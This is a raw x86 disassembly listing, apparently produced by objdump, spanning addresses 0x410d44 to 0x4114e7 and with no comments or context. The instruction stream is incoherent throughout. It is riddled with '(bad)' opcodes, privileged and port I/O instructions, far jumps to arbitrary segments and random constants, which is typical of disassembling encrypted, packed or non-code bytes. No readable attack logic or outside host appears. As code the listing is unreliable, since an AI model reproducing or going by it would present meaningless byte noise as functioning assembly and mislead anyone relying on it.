  410d44:	add    eax,0x4fb7644c
  410d49:	adc    al,0x59
  410d4b:	add    eax,0x886811ac
  410d50:	push   cs
  410d51:	xchg   esp,eax
  410d52:	js     0x410d62
  410d54:	and    bl,BYTE PTR [edx]
  410d56:	aas    
  410d57:	ret    0x59c6
  410d5a:	dec    esp
  410d5b:	mov    eax,0x92c03fbd
  410d60:	bnd jmp 0x410de1
  410d63:	(bad)  
  410d64:	xchg   edx,eax
  410d65:	clc    
  410d66:	mov    ds,WORD PTR [edi-0x5]
  410d69:	popa   
  410d6a:	sub    al,0xd2
  410d6c:	mov    eax,edx
  410d6e:	jp     0x410db9
  410d70:	push   esi
  410d71:	sbb    edi,esi
  410d73:	lock ja 0x410d29
  410d76:	pushf  
  410d77:	fmul   DWORD PTR [esi+0x67c8f509]
  410d7d:	dec    ebx
  410d7e:	mov    ecx,0x3f5d364a
  410d83:	arpl   di,dx
  410d85:	shl    BYTE PTR [edx+0x3a],cl
  410d88:	iret   
  410d89:	bound  esi,QWORD PTR [esi-0x6fb60f32]
  410d8f:	iret   
  410d90:	inc    esi
  410d91:	jns    0x410d21
  410d93:	scas   eax,DWORD PTR es:[edi]
  410d94:	int3   
  410d95:	test   BYTE PTR ds:0x4f6b300d,0x3c
  410d9c:	push   cs
  410d9d:	jle    0x410dd2
  410d9f:	xor    bh,dh
  410da1:	jecxz  0x410d71
  410da3:	sbb    ah,BYTE PTR [ebx]
  410da5:	sub    eax,0x7f91c6af
  410daa:	mov    ah,0x7a
  410dac:	adc    ebp,DWORD PTR [edi+0x49]
  410daf:	xchg   ebp,eax
  410db0:	pop    ds
  410db1:	pop    ss
  410db2:	xor    ch,BYTE PTR [esi-0x2e]
  410db5:	rcr    esi,cl
  410db7:	cmp    dl,BYTE PTR [ecx]
  410db9:	xchg   esi,eax
  410dba:	pop    edi
  410dbb:	aad    0xdb
  410dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dbe:	add    al,0xdd
  410dc0:	loopne 0x410e3e
  410dc2:	and    dl,ah
  410dc4:	sar    ah,1
  410dc6:	ret    
  410dc7:	sbb    eax,0x45ed380e
  410dcc:	and    ebx,esi
  410dce:	stos   BYTE PTR es:[edi],al
  410dcf:	add    eax,0xdde77968
  410dd4:	lods   eax,DWORD PTR ds:[esi]
  410dd5:	div    al
  410dd7:	outs   dx,BYTE PTR ds:[esi]
  410dd8:	xchg   ebx,eax
  410dd9:	pop    ebx
  410dda:	xor    esp,edi
  410ddc:	push   edi
  410ddd:	dec    esi
  410dde:	cli    
  410ddf:	into   
  410de0:	push   edi
  410de1:	xchg   edx,eax
  410de2:	mov    edx,ecx
  410de4:	jae    0x410e38
  410de6:	in     eax,dx
  410de7:	xor    DWORD PTR ds:[esi-0x6a],edx
  410deb:	mov    ds:0x671b5fd5,al
  410df0:	stc    
  410df1:	test   DWORD PTR [ebp+0x4f657657],ecx
  410df7:	daa    
  410df8:	or     BYTE PTR [edi],dl
  410dfa:	je     0x410e17
  410dfc:	lods   al,BYTE PTR ds:[esi]
  410dfd:	or     al,0x62
  410dff:	aas    
  410e00:	jo     0x410dea
  410e02:	frstor [edi+0x60]
  410e05:	call   0xc9e4:0x8a51ace6
  410e0c:	test   BYTE PTR ss:[eax+eax*2+0x5d86863c],cl
  410e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e15:	jb     0x410e55
  410e17:	repnz cmp al,0x3
  410e1a:	dec    edi
  410e1b:	mov    BYTE PTR [eax-0x1464341d],bh
  410e21:	push   0xb8dcd3dc
  410e26:	int    0x95
  410e28:	or     ch,cl
  410e2a:	mov    al,ds:0x7c99cad6
  410e2f:	into   
  410e30:	out    0x85,eax
  410e32:	es ret 0xc0f7
  410e36:	test   DWORD PTR [ebp+0x59],edi
  410e39:	adc    DWORD PTR [edx-0x3c],esi
  410e3c:	(bad)  
  410e3d:	sti    
  410e3e:	test   al,0xa5
  410e40:	pop    ebp
  410e41:	mov    BYTE PTR [edi*2+0x5101394b],dh
  410e48:	sbb    al,0x35
  410e4a:	cmps   WORD PTR gs:[esi],WORD PTR es:[edi]
  410e4d:	jbe    0x410e09
  410e4f:	rcl    BYTE PTR [edi-0x6b],1
  410e52:	je     0x410ec8
  410e54:	(bad)  
  410e55:	adc    eax,0xc8cbde49
  410e5a:	push   ebp
  410e5b:	ret    0xaac9
  410e5e:	fst    DWORD PTR [edx]
  410e60:	mov    esi,0xe9d08644
  410e65:	lock push ds
  410e67:	push   ds
  410e68:	outs   dx,BYTE PTR ds:[esi]
  410e69:	push   esi
  410e6a:	and    DWORD PTR [esi-0x65],0xffffffda
  410e6e:	jg     0x410e29
  410e70:	cmp    BYTE PTR [edi],bh
  410e72:	out    dx,eax
  410e73:	xor    edi,DWORD PTR [edi+edi*4+0x6d]
  410e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e78:	popf   
  410e79:	(bad)  
  410e7a:	(bad)  
  410e7b:	fwait
  410e7c:	push   esp
  410e7d:	call   0x6ba403d1
  410e82:	fcmove st,st(5)
  410e84:	xor    DWORD PTR [ecx],ecx
  410e86:	push   ebx
  410e87:	call   0xa5e0:0x917dc6ae
  410e8e:	cwde   
  410e8f:	dec    esi
  410e90:	inc    esp
  410e91:	ins    BYTE PTR es:[edi],dx
  410e92:	out    0x61,al
  410e94:	xor    ebx,edx
  410e96:	lahf   
  410e97:	jbe    0x410ecf
  410e99:	imul   ecx,DWORD PTR [edi+edx*4],0xffffffe3
  410e9d:	lea    ebx,[ebp-0x70204d72]
  410ea3:	mov    ebx,0x50ad8a84
  410ea8:	push   eax
  410ea9:	add    BYTE PTR [ebx+ecx*4-0x439790ec],dh
  410eb0:	aad    0xcf
  410eb2:	popa   
  410eb3:	(bad)  
  410eb4:	xor    bh,dl
  410eb6:	sbb    eax,0x8e0ed8d
  410ebb:	xchg   ebx,eax
  410ebc:	adc    eax,0x471a9dca
  410ec1:	or     DWORD PTR [edx-0x32],ebp
  410ec4:	inc    ebp
  410ec5:	add    al,BYTE PTR [edx]
  410ec7:	call   0xa6d6d8d5
  410ecc:	xor    eax,DWORD PTR [ecx-0x6b663aaa]
  410ed2:	cmc    
  410ed3:	and    bl,BYTE PTR [edx+0x4019159c]
  410ed9:	pop    ds
  410eda:	cmp    eax,0xbc1c8304
  410edf:	(bad)  
  410ee0:	hlt    
  410ee1:	fst    QWORD PTR [ecx+edi*1+0x56]
  410ee5:	imul   edi,ebx,0x199e3182
  410eeb:	out    dx,eax
  410eec:	cmp    BYTE PTR [edi-0x3c01bc8],al
  410ef2:	rol    BYTE PTR [ecx],cl
  410ef4:	scas   al,BYTE PTR es:[edi]
  410ef5:	cmp    eax,0x73e47d13
  410efa:	inc    esi
  410efb:	push   ds
  410efc:	xlat   BYTE PTR ds:[ebx]
  410efd:	popa   
  410efe:	push   eax
  410eff:	cmp    bh,0xf9
  410f02:	pop    ecx
  410f03:	mov    edx,0x2b7f8dc6
  410f08:	repnz mov WORD PTR [edi],cs
  410f0b:	pop    esi
  410f0c:	xchg   esi,eax
  410f0d:	psubb  mm4,mm3
  410f10:	mov    eax,0x2e95dd84
  410f15:	cmp    BYTE PTR [esi+ebx*4-0x76],0xb4
  410f1a:	int3   
  410f1b:	xchg   DWORD PTR [ecx-0x344ebe47],ecx
  410f21:	ror    BYTE PTR [ecx-0x56f2a789],0x9
  410f28:	mov    eax,ds:0x843a6dcf
  410f2d:	test   BYTE PTR [edi],dh
  410f2f:	sub    cl,cl
  410f31:	xor    BYTE PTR [ebx+ebx*2-0x5b],dl
  410f35:	int3   
  410f36:	test   DWORD PTR [esi+0x5056b240],eax
  410f3c:	fs jmp 0xb46a09bb
  410f42:	push   ecx
  410f43:	unpcklps xmm3,XMMWORD PTR [esi]
  410f46:	lock mov esp,0xb0046a9d
  410f4c:	out    dx,eax
  410f4d:	xchg   esp,eax
  410f4e:	retf   0x67bd
  410f51:	mov    BYTE PTR [ebx+0x72e6cb89],al
  410f57:	push   ebp
  410f58:	push   0xffffffea
  410f5a:	fdiv   QWORD PTR [ebp+0x3731840a]
  410f60:	adc    cl,al
  410f62:	lahf   
  410f63:	lea    edi,[esi]
  410f65:	jge    0x410f9b
  410f67:	sti    
  410f68:	inc    esi
  410f69:	(bad)  
  410f6b:	mov    ds:0x534262ae,al
  410f70:	dec    edi
  410f71:	add    BYTE PTR [ebx*1+0x73412cb7],al
  410f78:	arpl   WORD PTR [edi],bx
  410f7a:	sub    dl,0xf
  410f7d:	imul   ebx,DWORD PTR [ebx+0x62],0x4ab078d
  410f84:	mov    eax,ds:0xf12a115c
  410f89:	dec    ebx
  410f8a:	outs   dx,DWORD PTR ds:[esi]
  410f8b:	pop    esi
  410f8c:	pop    esp
  410f8d:	mov    ecx,0x75e669b9
  410f92:	add    BYTE PTR [esi+0x2],bh
  410f95:	jmp    0xf8d5dee6
  410f9a:	jne    0x410fce
  410f9c:	adc    ebx,DWORD PTR [eax+0x61]
  410f9f:	(bad)  
  410fa0:	in     al,dx
  410fa1:	out    0x48,al
  410fa3:	mov    bl,0x8e
  410fa5:	inc    ecx
  410fa6:	inc    ecx
  410fa7:	xor    BYTE PTR [esi+0x11],dl
  410faa:	iret   
  410fab:	jno    0x410fb1
  410fad:	scas   eax,DWORD PTR es:[edi]
  410fae:	jmp    0x1d6:0x96f86aa3
  410fb5:	xor    DWORD PTR [esi+0x6c6c4465],edi
  410fbb:	inc    esp
  410fbc:	jle    0x410f5a
  410fbe:	sahf   
  410fbf:	push   esi
  410fc0:	pusha  
  410fc1:	xchg   ebp,eax
  410fc2:	and    al,0x87
  410fc4:	sbb    BYTE PTR [edx],ch
  410fc6:	adc    DWORD PTR [ecx+0x53],edi
  410fc9:	dec    esp
  410fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fcb:	shl    ebp,0x11
  410fce:	call   0x5ec4:0xa5bdc11
  410fd5:	mov    edi,0x67f3efd8
  410fda:	pop    ebx
  410fdb:	or     bl,BYTE PTR [edi+0x6ba19ba5]
  410fe1:	ss pop ebp
  410fe3:	xchg   ebx,eax
  410fe4:	sar    DWORD PTR [ecx+0x57],cl
  410fe7:	scas   al,BYTE PTR es:[edi]
  410fe8:	adc    esi,esi
  410fea:	pop    ebp
  410feb:	adc    DWORD PTR [ebp+0x7efd34b2],ebx
  410ff1:	xchg   ecx,eax
  410ff2:	adc    al,0xbf
  410ff4:	sbb    eax,0x56ff4bd
  410ff9:	std    
  410ffa:	inc    BYTE PTR [eax+0x29]
  410ffd:	mul    dl
  410fff:	mov    esp,0xfe53e55d
  411004:	sbb    al,0x1b
  411006:	adc    BYTE PTR [edi+0x1340c68f],dh
  41100c:	dec    edi
  41100d:	push   edx
  41100e:	in     al,0xa6
  411010:	lea    esp,[ecx]
  411012:	fsubr  QWORD PTR [edi]
  411014:	cmp    ebx,DWORD PTR [ebp-0xc3d5c0f]
  41101a:	popa   
  41101b:	or     al,0xf7
  41101d:	das    
  41101e:	dec    edx
  41101f:	fmul   QWORD PTR [ebp+0x1a39c963]
  411025:	retf   
  411026:	fisttp DWORD PTR [eax+0x5d]
  411029:	std    
  41102a:	int    0x13
  41102c:	pop    ebx
  41102d:	fisub  DWORD PTR [ebx+0x584d94e4]
  411033:	jmp    0x411008
  411035:	xchg   DWORD PTR [edx],esp
  411037:	inc    edi
  411038:	rcl    ecx,1
  41103a:	xor    eax,0x9191b302
  41103f:	add    ah,BYTE PTR [ecx+0x15e7471b]
  411045:	mov    ebx,0x6efd556b
  41104a:	and    al,0xd2
  41104c:	ins    BYTE PTR es:[edi],dx
  41104d:	lds    esi,FWORD PTR [esi+eax*4+0x76015ae7]
  411054:	aam    0x24
  411056:	fdivr  st(2),st
  411058:	xor    DWORD PTR [ebp-0x14],0x6f
  41105c:	add    ebp,edx
  41105e:	cmp    DWORD PTR [esi+0x44],esi
  411061:	das    
  411062:	call   0xefc4:0x54536f7
  411069:	enter  0x8c17,0xa5
  41106d:	jg     0x411090
  41106f:	neg    BYTE PTR [edi+eax*1+0x5c00a212]
  411076:	sub    al,0x9
  411078:	push   edx
  411079:	dec    ebx
  41107a:	push   esp
  41107b:	lea    ebx,[ebx]
  41107d:	neg    DWORD PTR [ebx-0x33]
  411080:	or     eax,0xf1eeb224
  411085:	shl    BYTE PTR [eax],0x5f
  411088:	cmc    
  411089:	pushf  
  41108a:	pusha  
  41108b:	les    ecx,FWORD PTR [edi-0x52]
  41108e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41108f:	pop    eax
  411090:	jp     0x41107a
  411092:	cmp    al,0xba
  411094:	jo     0x4110e7
  411096:	jecxz  0x41109e
  411098:	xor    DWORD PTR [ebp+0x6c],edi
  41109b:	test   al,0x47
  41109d:	cwde   
  41109e:	mov    ch,0x14
  4110a0:	pop    ss
  4110a1:	and    eax,0x3d19cce4
  4110a6:	sbb    al,0x48
  4110a8:	cli    
  4110a9:	xor    ebx,DWORD PTR [ebx+0x2d]
  4110ac:	push   esi
  4110ad:	mov    al,0x3b
  4110af:	stc    
  4110b0:	in     eax,0xf6
  4110b2:	add    al,0x38
  4110b4:	repnz sbb esi,DWORD PTR [edi]
  4110b7:	(bad)  
  4110b8:	iret   
  4110b9:	jg     0x4110c9
  4110bb:	pop    edi
  4110bc:	pop    esp
  4110bd:	loope  0x411138
  4110bf:	dec    edx
  4110c0:	call   0x5d0125e1
  4110c5:	jmp    0x4e6c:0xbf8d1cad
  4110cc:	out    0xe,al
  4110ce:	mov    ch,0xcb
  4110d0:	push   edi
  4110d1:	xor    ecx,eax
  4110d3:	cmp    esp,DWORD PTR [esp+eax*8]
  4110d6:	cld    
  4110d7:	(bad)  [eax-0xc]
  4110da:	mov    ch,0x2a
  4110dc:	shl    BYTE PTR [ebp-0x7fddbe16],1
  4110e2:	sub    al,0x6d
  4110e4:	(bad)  
  4110e5:	dec    BYTE PTR [ebx-0x1de07d74]
  4110eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ec:	in     eax,0x63
  4110ee:	ror    BYTE PTR [edi+0x69],0xa8
  4110f2:	sub    ebp,DWORD PTR [ecx-0x2c]
  4110f5:	mov    eax,0xdbcc146a
  4110fa:	adc    cl,al
  4110fc:	outs   dx,DWORD PTR ds:[esi]
  4110fd:	aad    0x23
  4110ff:	adc    edx,ebx
  411101:	hlt    
  411102:	sahf   
  411103:	pop    ebx
  411104:	xor    eax,0x392dad2d
  411109:	dec    edi
  41110a:	xor    BYTE PTR [edx],0x4b
  41110d:	rcr    BYTE PTR [ebx*4-0x42bae432],cl
  411114:	into   
  411115:	loopne 0x41115b
  411117:	sbb    edx,DWORD PTR [edi]
  411119:	or     ah,BYTE PTR [edi-0x7]
  41111c:	jp     0x411105
  41111e:	lods   eax,DWORD PTR ds:[esi]
  41111f:	ds push 0x90a4fd22
  411125:	pusha  
  411126:	(bad)
  41112a:	pop    es
  41112b:	xor    eax,DWORD PTR [esi]
  41112d:	(bad)  
  41112e:	mov    eax,ds:0x359e0cab
  411133:	cs cwde 
  411135:	sub    esp,DWORD PTR [edx+0x755ce717]
  41113b:	cdq    
  41113c:	jle    0x411156
  41113e:	sbb    ebp,DWORD PTR [eax-0x70]
  411141:	lds    eax,FWORD PTR [esi-0x4e]
  411144:	cmp    dh,BYTE PTR [ebx]
  411146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411147:	mov    edi,?
  411149:	mov    al,ds:0x58477532
  41114e:	and    DWORD PTR [edi],0xfffffffb
  411151:	stos   BYTE PTR es:[edi],al
  411152:	(bad)  
  411153:	jp     0x4111b3
  411155:	(bad)  
  411156:	gs mov cl,0xb8
  411159:	cmp    BYTE PTR [ebp-0x30],dh
  41115c:	cli    
  41115d:	test   DWORD PTR [esi-0x6d],edx
  411160:	xchg   DWORD PTR [esi+eax*4+0x49],esi
  411164:	les    edx,FWORD PTR [esi+0x3]
  411167:	xor    eax,0x92b25717
  41116c:	or     BYTE PTR [eax+0x39],dl
  41116f:	(bad)  [ebp+0x31]
  411172:	fidivr WORD PTR [edi-0x6f]
  411175:	mov    eax,es
  411177:	add    DWORD PTR [ebx],0xbe89b08
  41117d:	gs inc ecx
  41117f:	(bad)  
  411180:	sbb    edi,ebx
  411182:	ja     0x411152
  411184:	fisub  WORD PTR [eax-0x2b604731]
  41118a:	dec    ecx
  41118b:	jns    0x411120
  41118d:	sbb    DWORD PTR [ecx+0x4f5f8c04],esi
  411193:	out    dx,eax
  411194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411195:	jnp    0x41112e
  411197:	iret   
  411198:	outs   dx,DWORD PTR ds:[esi]
  411199:	out    dx,eax
  41119a:	(bad)  
  41119b:	sbb    al,0x1d
  41119d:	fidiv  DWORD PTR [eax-0x3a84b2e3]
  4111a3:	xchg   ecx,eax
  4111a4:	dec    esp
  4111a5:	sub    DWORD PTR [esi-0x4b],0xc7a34f83
  4111ac:	mov    ebx,0x5dcbac96
  4111b1:	cli    
  4111b2:	inc    ecx
  4111b3:	fwait
  4111b4:	xchg   esp,eax
  4111b5:	test   al,0xd5
  4111b7:	dec    edx
  4111b8:	jp     0x411184
  4111ba:	sub    dl,BYTE PTR [ebx-0x61]
  4111bd:	ins    BYTE PTR es:[edi],dx
  4111be:	sub    DWORD PTR [eax-0x4f],edi
  4111c1:	js     0x4111be
  4111c3:	arpl   WORD PTR [eax+ecx*2+0x56],ax
  4111c7:	sub    BYTE PTR [edx-0x7d],0x4f
  4111cb:	or     al,0x5d
  4111cd:	jns    0x41118d
  4111cf:	or     BYTE PTR [edx+0x49],dl
  4111d2:	push   esi
  4111d3:	push   esi
  4111d4:	popf   
  4111d5:	lds    esi,FWORD PTR [ecx]
  4111d7:	mov    bl,0x8e
  4111d9:	ins    DWORD PTR es:[edi],dx
  4111da:	mov    DWORD PTR [ebx+0x4bfc80c8],esp
  4111e0:	dec    ebx
  4111e1:	test   edi,ebx
  4111e3:	mov    edi,0x55ade2d3
  4111e8:	imul   edx,DWORD PTR [edx-0x3478b8e5],0x79
  4111ef:	cwde   
  4111f0:	and    DWORD PTR [ebx],ebp
  4111f2:	clc    
  4111f3:	pop    ds
  4111f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111f5:	pop    esi
  4111f6:	xor    ecx,ebp
  4111f8:	add    eax,0x9756d32f
  4111fd:	outs   dx,BYTE PTR ds:[esi]
  4111fe:	dec    ebp
  4111ff:	aad    0xa6
  411201:	push   ebp
  411203:	imul   ecx,DWORD PTR [ecx],0x44
  411206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411207:	jae    0x41122b
  411209:	aas    
  41120a:	hlt    
  41120b:	shl    DWORD PTR [edi],1
  41120d:	daa    
  41120e:	xor    eax,0x7e03eab9
  411213:	mov    al,0xab
  411215:	and    BYTE PTR ss:[ebp+0x779d259e],al
  41121c:	and    eax,0xd8707619
  411221:	push   ebx
  411222:	mov    al,0xdd
  411224:	sub    eax,0x398d1a66
  411229:	test   DWORD PTR [esi-0x79],ecx
  41122c:	mov    ds:0xfd1ddced,al
  411231:	aad    0xaf
  411233:	cmp    edi,edx
  411235:	jmp    0xe74f:0xb168c38a
  41123c:	mov    bh,al
  41123e:	or     DWORD PTR gs:[esi-0x3a],edx
  411242:	jmp    0x9f78:0x32287933
  411249:	in     al,0xaf
  41124b:	jmp    0x41125b
  41124d:	call   0x5896:0xcfdb545
  411254:	leave  
  411255:	and    dh,BYTE PTR [ebx+edx*4]
  411258:	pop    edi
  411259:	loopne 0x4112cb
  41125b:	xlat   BYTE PTR ds:[ebx]
  41125c:	xchg   esi,eax
  41125d:	mov    DWORD PTR [ebx],esp
  41125f:	lds    ebx,FWORD PTR [edi+0x444500f1]
  411265:	imul   esp,DWORD PTR [ebp+ebp*1+0x27057ee],0xffffffb4
  41126d:	jne    0x4111f4
  41126f:	dec    edi
  411270:	lahf   
  411271:	neg    cl
  411273:	xchg   edx,eax
  411274:	rdmsr  
  411276:	fwait
  411277:	adc    BYTE PTR es:0x785b79ef,cl
  41127e:	pop    esi
  41127f:	jno    0x41129f
  411281:	icebp  
  411282:	daa    
  411283:	sbb    DWORD PTR [edi+ebx*1+0x1d1c34ae],0x5a
  41128b:	xchg   esi,eax
  41128c:	dec    esp
  41128d:	addr16 stc 
  41128f:	popf   
  411290:	retf   0x2959
  411293:	dec    esi
  411294:	lea    eax,[ebx-0x52]
  411297:	lods   al,BYTE PTR ds:[esi]
  411298:	mov    bh,0xea
  41129a:	jns    0x411282
  41129c:	mov    BYTE PTR ds:0xb9126b4f,bh
  4112a2:	mov    eax,0x64181671
  4112a7:	xchg   esi,eax
  4112a8:	call   0xe7bc9251
  4112ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112ae:	popa   
  4112af:	test   al,0x74
  4112b1:	rcl    DWORD PTR [edx],cl
  4112b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112b4:	xchg   esp,eax
  4112b5:	in     eax,dx
  4112b6:	mov    al,0xee
  4112b8:	retf   
  4112b9:	addr16 (bad) 
  4112bc:	cli    
  4112bd:	push   edx
  4112be:	cld    
  4112bf:	cli    
  4112c0:	sub    al,0xa
  4112c2:	adc    al,0xbe
  4112c4:	dec    ecx
  4112c5:	jl     0x411253
  4112c7:	aaa    
  4112c8:	adc    DWORD PTR [ebx-0x3],edx
  4112cb:	mov    ds:0xd38f6b6d,eax
  4112d0:	shl    DWORD PTR [edx],0x6f
  4112d3:	daa    
  4112d4:	stos   DWORD PTR es:[edi],eax
  4112d5:	pop    ebx
  4112d6:	loopne 0x4112cc
  4112d8:	inc    esi
  4112d9:	inc    ebp
  4112da:	in     al,0x3
  4112dc:	mov    bh,0xa0
  4112de:	ins    DWORD PTR es:[edi],dx
  4112df:	pop    ds
  4112e0:	xor    esi,DWORD PTR [esi-0x1d]
  4112e3:	das    
  4112e4:	mov    esp,0x3a3fc768
  4112e9:	xchg   ebp,eax
  4112ea:	sbb    bh,BYTE PTR [ecx-0x2b]
  4112ed:	xor    eax,0x647f04d8
  4112f2:	jb     0x4112f3
  4112f4:	mov    WORD PTR [edi+0x61],fs
  4112f7:	cmp    BYTE PTR [eax+0x68cd3a54],cl
  4112fd:	and    esi,DWORD PTR [eax-0x4efeef80]
  411303:	ret    0x62eb
  411306:	mov    ?,WORD PTR [esi+ebp*2]
  411309:	inc    eax
  41130a:	xor    DWORD PTR [esi],edi
  41130c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41130d:	outs   dx,BYTE PTR ds:[esi]
  41130e:	sbb    edi,DWORD PTR [ecx]
  411310:	adc    cl,dl
  411312:	pop    edi
  411313:	pop    esi
  411314:	dec    edx
  411315:	xchg   edx,eax
  411316:	cmp    eax,0xba84899e
  41131b:	adc    bl,BYTE PTR [eax-0x5ba2aff1]
  411321:	dec    ecx
  411322:	dec    eax
  411323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411324:	cwde   
  411325:	aam    0x31
  411327:	add    DWORD PTR [edi+ecx*4],edx
  41132a:	sbb    al,dh
  41132c:	enter  0xd65c,0xa1
  411330:	jno    0x411361
  411332:	mov    bh,0xc0
  411334:	scas   eax,DWORD PTR es:[edi]
  411335:	mov    esp,0x728bd747
  41133a:	push   esi
  41133b:	rcl    BYTE PTR [esi+0x13],1
  41133e:	clc    
  41133f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411340:	stc    
  411341:	popa   
  411342:	out    dx,eax
  411343:	push   esp
  411344:	and    eax,DWORD PTR [eax]
  411346:	push   ebx
  411347:	mov    ah,0xbe
  411349:	sub    eax,0x54fbdd1f
  41134e:	call   0x9ca3:0x11335a73
  411355:	call   0x1bb9b63d
  41135a:	inc    ebx
  41135b:	test   ecx,ebp
  41135d:	test   DWORD PTR [edx-0x2b],esp
  411360:	into   
  411361:	mov    edx,0x1001f12a
  411366:	dec    edx
  411367:	loope  0x411310
  411369:	daa    
  41136a:	outs   dx,DWORD PTR ds:[esi]
  41136b:	pop    es
  41136c:	sub    DWORD PTR [ebp-0xeb048de],0x4e
  411373:	dec    esp
  411374:	sbb    eax,0x70a17d8b
  411379:	push   es
  41137a:	test   bh,ah
  41137c:	enter  0xf3d7,0x6a
  411380:	add    BYTE PTR [edx],ah
  411382:	pop    es
  411383:	inc    edx
  411384:	dec    eax
  411385:	int    0x77
  411387:	push   0x69
  411389:	xchg   DWORD PTR [eax-0x38],esi
  41138c:	data16 jge 0x4113db
  41138f:	xchg   BYTE PTR [edi],bh
  411391:	sub    eax,0x2260b9ea
  411396:	xor    DWORD PTR [edx-0x6c],esp
  411399:	mov    edi,0x38a81f3
  41139e:	test   al,0xd
  4113a0:	(bad)  
  4113a2:	pop    esp
  4113a3:	cld    
  4113a4:	sbb    al,0xc7
  4113a6:	jl     0x4113fc
  4113a8:	xchg   ebx,eax
  4113a9:	sbb    ah,BYTE PTR [ecx-0x68]
  4113ac:	in     eax,0x13
  4113ae:	jge    0x4113b8
  4113b0:	and    BYTE PTR [ebx+0x20],cl
  4113b3:	cmp    bl,BYTE PTR [ecx-0x53]
  4113b6:	add    esp,esi
  4113b8:	mov    WORD PTR [eax+0x12],fs
  4113bb:	push   ecx
  4113bc:	pop    ds
  4113bd:	enter  0x8c9d,0x9d
  4113c1:	and    DWORD PTR [esi-0x3068035a],edi
  4113c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113c8:	sahf   
  4113c9:	and    eax,0xcd40cb45
  4113ce:	popf   
  4113cf:	dec    ecx
  4113d0:	xor    ebx,DWORD PTR [edi]
  4113d2:	push   cs
  4113d3:	out    0x21,eax
  4113d5:	(bad)  
  4113d6:	pop    edi
  4113d7:	loop   0x41137a
  4113d9:	and    eax,0x22114437
  4113de:	outs   dx,DWORD PTR ds:[esi]
  4113df:	mov    ah,0x45
  4113e1:	repz fcomip st,st(0)
  4113e4:	imul   ebp,DWORD PTR [esi-0x27],0x641e4cee
  4113eb:	inc    esp
  4113ec:	mov    edi,0x45adbdf
  4113f1:	add    eax,0xbdb0a43d
  4113f6:	inc    eax
  4113f7:	jo     0x411476
  4113f9:	jmp    0x411422
  4113fb:	rcl    eax,1
  4113fd:	mov    ecx,DWORD PTR [edx]
  4113ff:	sub    BYTE PTR gs:[ecx],0xb8
  411403:	mov    ch,0xd5
  411405:	mov    ecx,0xfea9bff2
  41140a:	jl     0x4113e1
  41140c:	cli    
  41140d:	xchg   esp,eax
  41140e:	sar    DWORD PTR [ebx+eax*4+0x66444463],cl
  411415:	mov    edx,cs
  411417:	jmp    ebp
  411419:	cmp    dl,BYTE PTR [ecx+0x29163c32]
  41141f:	mov    es,WORD PTR [esi+0x1a]
  411422:	mov    esp,0x489e185a
  411427:	jge    0x4113dc
  411429:	add    dl,dl
  41142b:	retf   0xd3c8
  41142e:	xchg   DWORD PTR [ebp-0x56],esp
  411431:	xchg   ebx,eax
  411432:	imul   edi,DWORD PTR [ebx],0xffffff89
  411435:	loope  0x411429
  411437:	cmc    
  411438:	(bad)  
  411439:	xchg   ebp,eax
  41143a:	inc    esi
  41143b:	sub    eax,0x5afa8024
  411440:	xchg   DWORD PTR [edi],ebp
  411442:	jp     0x4113e0
  411444:	jle    0x411498
  411446:	aam    0x41
  411448:	xor    ebp,eax
  41144a:	stc    
  41144b:	adc    BYTE PTR [eax+ecx*1-0x29],ch
  41144f:	aas    
  411450:	mov    tr6,ecx
  411453:	xchg   esp,eax
  411454:	inc    edx
  411455:	dec    ecx
  411456:	jp     0x411411
  411458:	pop    ss
  411459:	mov    edi,0x65bdf342
  41145e:	cmp    eax,0x1a5d1279
  411463:	fs hlt 
  411465:	fidiv  WORD PTR [eax-0x29]
  411468:	out    dx,al
  411469:	or     BYTE PTR [eax+0x73b86fab],bl
  41146f:	sbb    BYTE PTR [eax+0x0],dh
  411472:	mov    ah,0xfb
  411474:	mov    eax,ds:0x1308e145
  411479:	leave  
  41147a:	cmp    bh,BYTE PTR [ebx-0x23f0a14c]
  411480:	mov    fs,WORD PTR [ebx+0x6d]
  411483:	popa   
  411484:	pop    ss
  411485:	lahf   
  411486:	sbb    al,0x28
  411488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411489:	sar    BYTE PTR [ebx],0xea
  41148c:	sub    dh,bh
  41148e:	dec    esp
  41148f:	push   esp
  411490:	stc    
  411491:	or     al,0x8b
  411493:	xlat   BYTE PTR ds:[ebx]
  411494:	dec    ebp
  411495:	js     0x4114e4
  411497:	daa    
  411498:	jecxz  0x4114f7
  41149a:	xchg   bh,al
  41149c:	rcr    BYTE PTR [edi-0x579e5f19],cl
  4114a2:	jb     0x41142b
  4114a4:	xor    DWORD PTR [esi+esi*1],esp
  4114a7:	test   eax,0x400791f4
  4114ac:	daa    
  4114ad:	pop    edx
  4114ae:	push   cs
  4114af:	dec    esp
  4114b0:	icebp  
  4114b1:	sar    BYTE PTR ds:0x7987c25e,cl
  4114b7:	popa   
  4114b8:	jb     0x4114ad
  4114ba:	retf   0x5439
  4114bd:	bound  ebp,QWORD PTR [edx+0x32230fd3]
  4114c3:	and    cl,dh
  4114c5:	loope  0x4114ea
  4114c7:	fsubr  st(3),st
  4114c9:	out    dx,eax
  4114ca:	neg    BYTE PTR [ecx]
  4114cc:	jbe    0x41149b
  4114ce:	pop    ds
  4114cf:	lock cmp al,0x43
  4114d2:	mov    al,ds:0x2f50db81
  4114d7:	mov    al,0x68
  4114d9:	adc    ch,al
  4114db:	add    esp,0x68
  4114de:	jge    0x4114a1
  4114e0:	popw   ds
  4114e2:	dec    esp
  4114e3:	jne    0x4114a9
  4114e5:	dec    eax
  4114e6:	std    
  4114e7:	inc    esi
